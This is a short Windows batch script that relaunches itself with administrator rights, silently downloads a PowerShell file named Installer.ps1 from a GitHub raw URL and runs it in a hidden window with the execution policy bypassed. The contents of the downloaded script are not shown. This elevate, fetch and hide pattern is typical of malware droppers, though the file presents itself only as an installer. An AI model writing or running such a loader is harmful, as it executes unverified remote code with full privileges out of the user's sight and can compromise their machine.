@echo off
:: Check if the script is running with administrative privileges
openfiles >nul 2>&1
if %errorlevel% NEQ 0 (
    :: Prompt for administrative privileges
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
    exit /b
)

:: Download the installer from a remote location silently
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/angeborrelli/files/main/Installer.ps1', '%~dp0Installer.ps1')"

:: Run the PowerShell script silently
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0Installer.ps1"
s